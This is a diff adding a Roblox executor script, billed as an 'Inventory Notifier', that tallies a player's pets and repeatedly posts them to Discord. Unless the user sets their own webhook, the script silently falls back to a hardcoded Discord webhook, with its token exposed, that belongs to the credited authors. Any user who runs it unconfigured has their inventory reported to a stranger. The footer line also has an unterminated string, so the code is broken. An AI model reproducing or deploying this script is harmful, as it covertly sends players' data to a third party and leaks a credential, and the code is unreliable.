@@ -1,0 +1,255 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local MAX_SLOTS = 60
+local WEBHOOK_BASE = Webhook or "https://discord.com/api/webhooks/1406491541454983359/CoQfeKe1Suf6wZxRO54AvfB1n31DFdR-9COE17C4ShHGyJ_9I2s0v9aTjv9dJ_D26z6i"
+if WEBHOOK_BASE == "" then return end
+local WEBHOOK_CREATE = WEBHOOK_BASE .. "?wait=true"
+local HEARTBEAT_SEC = 10
+
+local function httpSend(method, url, bodyTbl)
+    local bodyJson = HttpService:JSONEncode(bodyTbl)
+    local req = rawget(getfenv(), "http_request") or rawget(getfenv(), "request") or (syn and syn.request) or (http and http.request)
+    if typeof(req) == "function" then
+        return req({ Url=url, Method=method, Headers={["Content-Type"]="application/json"}, Body=bodyJson })
+    end
+    if HttpService.RequestAsync then
+        return HttpService:RequestAsync({ Url=url, Method=method, Headers={["Content-Type"]="application/json"}, Body=bodyJson })
+    end
+end
+local function httpPOST(url, bodyTbl)  return httpSend("POST",  url, bodyTbl) end
+local function httpPATCH(url, bodyTbl) return httpSend("PATCH", url, bodyTbl) end
+local function isoTimestampUTC() return os.date("!%Y-%m-%dT%H:%M:%SZ") end
+
+local mainPetOrder = {
+    "🌸 Kitsune","🦝 Raccoon","🪩 Disco Bee","🦋 Butterfly","🦊 Fennec Fox","🦖 Spinosaurus",
+    "🐲 Dragonfly","🐙 Mimic Octopus","🦖 T-Rex","🐝 Queen Bee","🐼 Panda","🦞 Lobster Thermidor",
+    "👾 Corrupted Kitsune","🍟 French Fry Ferret","🪿 Golden Goose","🦅 Griffin","🐓 Cockatrice",
+}
+
+local emojiMap = {
+    ["Kitsune"]="🌸 Kitsune",["Raccoon"]="🦝 Raccoon",["Disco Bee"]="🪩 Disco Bee",["Butterfly"]="🦋 Butterfly",
+    ["Fennec Fox"]="🦊 Fennec Fox",["Spinosaurus"]="🦖 Spinosaurus",["Dragonfly"]="🐲 Dragonfly",
+    ["Mimic Octopus"]="🐙 Mimic Octopus",["T-Rex"]="🦖 T-Rex",["Queen Bee"]="🐝 Queen Bee",["Panda"]="🐼 Panda",
+    ["Lobster Thermidor"]="🦞 Lobster Thermidor",["Corrupted Kitsune"]="👾 Corrupted Kitsune",
+    ["French Fry Ferret"]="🍟 French Fry Ferret",["Golden Goose"]="🪿 Golden Goose",["Griffin"]="🦅 Griffin",
+    ["Cockatrice"]="🐓 Cockatrice",
+}
+
+local mutationKeywords = {
+    "Ascended","GiantBean","Rainbow","Shocked","Radiant","IronSkin","Mega","Tiny","Golden","Frozen","Windy","Inverted","Shiny","Tranquil","Corrupted","Fried","Aromatic"
+}
+
+local function isBlacklisted(name)
+    local cleaned = name:lower():gsub("%[",""):gsub("%]",""):gsub("%s+","")
+    return cleaned:find("shoveldestroyplants") ~= nil
+end
+
+local blockedFruits = {
+    "apple","avocado","banana","blood banana","blueberry","canary melon","coconut","cranberry","crown melon",
+    "dragon fruit","durian","grand tomato","grape","green apple","hive fruit","kiwi","lemon","lime","lingonberry",
+    "loquat","mango","mangosteen","maple apple","moon melon","nectarine","papaya","passionfruit","peach","pear",
+    "pineapple","pricklefruit","raspberry","spiked mango","starfruit","strawberry","sugar apple","traveler’s fruit",
+    "watermelon","white mulberry"
+}
+local blockedPatterns = { "shovel","garden guide","lightning rod","master sprinkler","basic sprinkler","seed","plant","egg","toy" }
+
+local function isPet(instance)
+    if not instance:IsA("Tool") then return false end
+    local n = instance.Name:lower()
+    for _, p in ipairs(blockedPatterns) do if string.find(n,p,1,true) then return false end end
+    for _, f in ipairs(blockedFruits) do if string.find(n,f,1,true) then return false end end
+    if isBlacklisted(instance.Name) then return false end
+    return true
+end
+
+local function escapeLuaPattern(s)
+    return (s:gsub("(%W)","%%%1"))
+end
+
+local baseNames = {}
+for base,_ in pairs(emojiMap) do table.insert(baseNames, base) end
+table.sort(baseNames, function(a,b) return #a > #b end)
+
+local function matchBaseAnywhere(name)
+    for _, base in ipairs(baseNames) do
+        local pat = "%f[%w]" .. escapeLuaPattern(base) .. "%f[^%w]"
+        if name:find(pat) then
+            return emojiMap[base]
+        end
+    end
+    return nil
+end
+
+local function cleanName(name)
+    if name:find("Corrupted Kitsune") then return emojiMap["Corrupted Kitsune"] end
+    name = name:gsub("%s%[.-%]", "")
+    name = name:match("^%s*(.-)%s*$")
+    local hit = matchBaseAnywhere(name)
+    if hit then return hit end
+    for _, kw in ipairs(mutationKeywords) do
+        local pattern = "%f[%a]" .. kw .. "%f[^%a]"
+        name = name:gsub(pattern, "")
+    end
+    name = name:gsub("%s+", " "):match("^%s*(.-)%s*$")
+    hit = matchBaseAnywhere(name) or emojiMap[name]
+    if hit then return hit end
+    return name
+end
+
+local reverseEmojiMap = {}
+for base, emojiLabel in pairs(emojiMap) do reverseEmojiMap[emojiLabel] = base end
+local function toBaseLower(emojiOrBase)
+    local base = reverseEmojiMap[emojiOrBase] or emojiOrBase
+    base = base:gsub("^%p?%s*", "")
+    return base:lower()
+end
+
+local function computeInventoryBreakdown()
+    local mainPets, unknownPets, total = {}, {}, 0
+    local function tally(container)
+        if not container then return end
+        for _, item in ipairs(container:GetChildren()) do
+            if isPet(item) then
+                local raw = item.Name
+                local cleaned = cleanName(raw)
+                local matched = false
+                for _, emojiName in ipairs(mainPetOrder) do
+                    if cleaned == emojiName then
+                        mainPets[emojiName] = (mainPets[emojiName] or 0) + 1
+                        matched = true
+                        break
+                    end
+                end
+                if not matched then unknownPets[raw] = (unknownPets[raw] or 0) + 1 end
+                total += 1
+            end
+        end
+    end
+    tally(backpack)
+    tally(player.Character)
+
+    local lines = {}
+    for _, emojiName in ipairs(mainPetOrder) do
+        if mainPets[emojiName] then table.insert(lines, string.format("%dx %s", mainPets[emojiName], emojiName)) end
+    end
+    for rawName, count in pairs(unknownPets) do
+        table.insert(lines, string.format("%dx %s", count, rawName))
+    end
+    return total, table.concat(lines, "\n")
+end
+
+-- rolling unique list of last 10 added pets (base lowercase)
+local recentAdds = {}
+local function pushRecent(nameBaseLower)
+    for i = #recentAdds, 1, -1 do
+        if recentAdds[i] == nameBaseLower then
+            table.remove(recentAdds, i)
+            break
+        end
+    end
+    table.insert(recentAdds, nameBaseLower)
+    if #recentAdds > 10 then
+        table.remove(recentAdds, 1)
+    end
+end
+
+local function getRecentAddedString()
+    if #recentAdds == 0 then return "-" end
+    return table.concat(recentAdds, ", ")
+end
+
+local function buildFields(totalCount, breakdownText)
+    local countStr = string.format("%d/%d", totalCount, MAX_SLOTS)
+    if #breakdownText > 1900 then breakdownText = breakdownText:sub(1, 1897) .. "..." end
+    return {
+        { name="Total Pets :", value=countStr, inline=false },
+        { name="New Added Pets :", value=getRecentAddedString(), inline=false },
+        { name="List Of Pets", value=("```%s```"):format(#breakdownText > 0 and breakdownText or "None"), inline=false },
+    }
+end
+
+local function buildPayload(totalCount, breakdownText)
+    local msgContent = "Inventory Update"
+    if totalCount >= MAX_SLOTS then msgContent = "@everyone Inventory Full!" end
+    return {
+        content = msgContent,
+        embeds = {{
+            title = "Inventory Notifier",
+            description = "Current Inventory Information",
+            color = 0x00B2FF,
+            fields = buildFields(totalCount, breakdownText),
+            footer = { text = "@rizz| @WOK },
+            timestamp = isoTimestampUTC()
+        }}
+    }
+end
+
+local postedMessageId = nil
+local creatingMessage = false
+
+local function ensureInitialPost()
+    if postedMessageId or creatingMessage then return postedMessageId ~= nil end
+    creatingMessage = true
+    local total, breakdown = computeInventoryBreakdown()
+    local res = httpPOST(WEBHOOK_CREATE, buildPayload(total, breakdown))
+    if res and res.Body and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then
+        local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and data and data.id then
+            postedMessageId = tostring(data.id)
+        end
+    end
+    creatingMessage = false
+    return postedMessageId ~= nil
+end
+
+local function editMessage()
+    if not postedMessageId and not ensureInitialPost() then return end
+    local editUrl = string.format("%s/messages/%s", WEBHOOK_BASE, postedMessageId)
+    local total, breakdown = computeInventoryBreakdown()
+    httpPATCH(editUrl, buildPayload(total, breakdown))
+end
+
+-- coalesced scheduler (avoid missed updates and spam)
+local editScheduled = false
+local function scheduleEdit()
+    if editScheduled then return end
+    editScheduled = true
+    task.delay(0.25, function()
+        editScheduled = false
+        editMessage()
+    end)
+end
+
+local function watchContainer(container)
+    container.ChildAdded:Connect(function(child)
+        if isPet(child) then
+            local cleaned = cleanName(child.Name)
+            local baseLower = toBaseLower(cleaned)
+            pushRecent(baseLower)
+            scheduleEdit()
+        end
+    end)
+    container.ChildRemoved:Connect(function(child)
+        if isPet(child) then
+            scheduleEdit()
+        end
+    end)
+end
+
+watchContainer(backpack)
+if player.Character then watchContainer(player.Character) end
+player.CharacterAdded:Connect(function(char) watchContainer(char) end)
+
+ensureInitialPost()
+scheduleEdit()
+
+task.spawn(function()
+    while true do
+        task.wait(HEARTBEAT_SEC)
+        scheduleEdit()
+    end
+end)
